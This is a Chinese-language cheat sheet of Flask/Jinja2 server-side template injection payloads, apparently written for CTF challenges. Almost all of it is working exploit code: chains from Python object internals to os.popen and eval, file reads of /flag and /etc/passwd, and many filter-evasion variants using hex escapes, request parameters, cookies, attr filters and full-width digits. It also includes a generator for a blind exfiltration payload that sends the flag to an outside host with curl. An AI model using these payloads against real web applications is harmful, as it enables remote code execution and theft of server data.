## **基础概念**
```
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，d样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>
```

^
## **利用链**
直接使用popen（python2不行）
```
os._wrap_close 类里有popen

"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
```
使用os下的popen
```
含有 os 的基类都可以，如 linecache

"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
```

使用__import__下的os（python2不行)
```
可以使用 __import__ 的 os

"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()
```

__builtins__下的多个函数
```
__builtins__下有eval，__import__等的函数，可以利用此来执行命令

"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

利用python2的file类读取文件
```
在 python3 中 file 类被删除

# 读文件
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()
# 写文件
"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')
# python2的str类型不直接从属于属于基类，所以要两次 .__bases__
```

flask的内置函数
```
Flask内置函数和内置对象可以通过{{self.__dict__._TemplateReference__context.keys()}}查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）

{{self.__dict__._TemplateReference__context.keys()}}
#查看内置函数
#函数：lipsum、url_for、get_flashed_messages
#类：cycler、joiner、namespace、config、request、session
{{lipsum.__globals__.os.popen('ls').read()}}
#函数
{{cycler.__init__.__globals__.os.popen('ls').read()}}
#类
```

自动利用链
```
原理就是找到含有 __builtins__ 的类，然后利用

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
#读写文件
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```


^
## **利用链的思路**
```
1.随便找一个内置类对象用__class__拿到他所对应的类
2.用__bases__拿到基类（<class 'object'>）
3.用__subclasses__()拿到子类列表
4.在子类列表中直接寻找可以利用的类getshell

对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数
```


^
^
## **点._绕过**
单引号'被过滤可以用双引号"代替；

至于点.和下划线_被过滤可以采用16进制来表示，用的方式选定。知道怎么过滤了那就照着以前payload修改就好了。
```
{{config["\x5f\x5fclass\x5f\x5f"]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("whoami")["read"]()}}

利用frozen_importlib_external.FileLoader类
get_data方法直接读打开过的文件内容
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
```

^
## **引号绕过**
传参绕过
```
?name={{lipsum.__globals__.os.popen(request.args.ocean).read()}}&ocean =cat /flag
?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=cat /flag
```

下面拿到os后继续传参绕过request.args.a进行popen

字符串拼接绕过
```
(config.__str__()[2])
(config.__str__()[42])	

?name={{url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]}}
等于
?name={{url_for.__globals__['os']}}
```

chr拼接绕过
```
?name={% set chr=url_for.__globals__.__builtins__.chr %}{% print  url_for.__globals__[chr(111)%2bchr(115)]%}
```



^
## **基础关键词绕过**
如由于使用\['**globals**']会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式\['**glo'+'bals**']

```
{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}


等效：
request.__class__
request["__class__"]
request["__cla""ss__"]
request["__cla"+"ss__"]
request|attr("__class__")

array[0]
array.pop(0)
```


^
## **请求参数args过滤绕过**
1、不用args，通过values获取所有参数。
```
?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag
```
2、通过cookie
```
?name={{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}

cookie传参：
a=os;b=popen;c=cat /flag
```


^
## **过滤[]绕过**
现单双引号、args、[]被过滤
```
# values 没有被过滤
?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag

# cookie 可以使用
?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
Cookie:c=cat /flag


过滤了[]
用__getitem__(下标)
```


^
## **过滤_下划线绕过**

传参绕过
```
?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read
```
cookie绕过
```
?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}

cookie:a=__globals__;b=cat /flag
```



^
## **过滤OS**
过滤了单双引号、args、中括号l、下划线、os
还是传参绕过。
```
?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag
```


^
## **过滤了{{**
用{% 继续传参绕过
```
?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
```
```
?name={% print(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read() %}

Cookie:a=__globals__;b=os;c=cat /flag
```



^
## **过滤了request**
369
替换字符
```
lipsum.__globals__['__builtins__'].open('/flag').read()
# 在__builtins__里面拿到chr，同样可以很方便的构造字符
```
```
?name=
{% set a=(()|select|string|list).pop(24) %}
{
   % set globals=(a,a,dict(globals=1)|join,a,a)|join %}
{
   % set init=(a,a,dict(init=1)|join,a,a)|join %}
{
   % set builtins=(a,a,dict(builtins=1)|join,a,a)|join %}
{
   % set a=(lipsum|attr(globals)).get(builtins) %}
{
   % set chr=a.chr %}
{
   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}

```
读/flag


^
## **过滤数字**
370
用全角数字
```
def half2full(half):
    full = ''
    for ch in half:
        if ord(ch) in range(33, 127):
            ch = chr(ord(ch) + 0xfee0)
        elif ord(ch) == 32:
            ch = chr(0x3000)
        else:
            pass
        full += ch
    return full
while 1:
    t = ''
    s = input("输入想要转换的数字字符串：")
    for i in s:
        t += half2full(i)
    print(t)
```
```
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}
{%print(x.open(file).read())%}
```

```
{%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
{%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
{%set x=(()|select|string|list).pop(num)%}
{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}
{%set builtins=x~x~(dict(builtins=a)|join)~x~x%}
{%set c = dict(chr=a)|join%}
{%set o = dict(o=a,s=a)|join%}
{%set getitem = x~x~(dict(getitem=a)|join)~x~x%}
{%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%}
{%set file = chr(numm)~dict(flag=a)|join%}
{%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%}
```

^
## **过滤print关键词，不回显**

用curl外带
脚本
```
import re
def filting(s):
    return "".join([f"chr({ord(i)})~" for i in s])[:-1]
cmd=filting("curl https://eastjun.top?flag=`cat /flag`")
nums = set(re.findall("(\d+)",cmd))
for i in nums:
    patnum = "".join(["zero~" if j=="0" else f'{"e" * int(j)}~' for j in f"{i}"])
    cmd = cmd.replace(f"{i}",f"({patnum[:-1]})|int")
print(cmd)
```
替换下面的cmd
```
{%set e=dict(a=a)|join|count%}
{%set ee=dict(aa=a)|join|count%}
{%set eee=dict(aaa=a)|join|count%}
{%set eeee=dict(aaaa=a)|join|count%}
{%set eeeee=dict(aaaaa=a)|join|count%}
{%set eeeeee=dict(aaaaaa=a)|join|count%}
{%set eeeeeee=dict(aaaaaaa=a)|join|count%}
{%set eeeeeeee=dict(aaaaaaaa=a)|join|count%}
{%set eeeeeeeee=dict(aaaaaaaaa=a)|join|count%}
{%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|count%}
{%set x=(()|select|string|list).pop((ee~eeee)|int)%}
{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}
{%set builtins=x~x~(dict(builtins=a)|join)~x~x%}
{%set import=x~x~(dict(import=a)|join)~x~x%}
{%set c = dict(chr=a)|join%}
{%set o = dict(o=a,s=a)|join%}
{%set getitem = x~x~(dict(getitem=a)|join)~x~x%}
{%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%}
{%set zero=chr((eeee~eeeeeeee)|int)%}
{%set cmd = 
%}
{%if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)%}
eastjun
{%endif%}
```
如果过滤count，替换成下面
```
{%set e=dict(a=a)|join|length%}
{%set ee=dict(aa=a)|join|length%}
{%set eee=dict(aaa=a)|join|length%}
{%set eeee=dict(aaaa=a)|join|length%}
{%set eeeee=dict(aaaaa=a)|join|length%}
{%set eeeeee=dict(aaaaaa=a)|join|length%}
{%set eeeeeee=dict(aaaaaaa=a)|join|length%}
{%set eeeeeeee=dict(aaaaaaaa=a)|join|length%}
{%set eeeeeeeee=dict(aaaaaaaaa=a)|join|length%}
{%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|length%}
{%set x=(()|select|string|list).pop((ee~eeee)|int)%}
{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}
{%set builtins=x~x~(dict(builtins=a)|join)~x~x%}
{%set import=x~x~(dict(import=a)|join)~x~x%}
{%set c = dict(chr=a)|join%}
{%set o = dict(o=a,s=a)|join%}
{%set getitem = x~x~(dict(getitem=a)|join)~x~x%}
{%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%}
{%set zero=chr((eeee~eeeeeeee)|int)%}
{%set cmd = 
%}
{%if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)%}
eastjun
{%endif%}
```
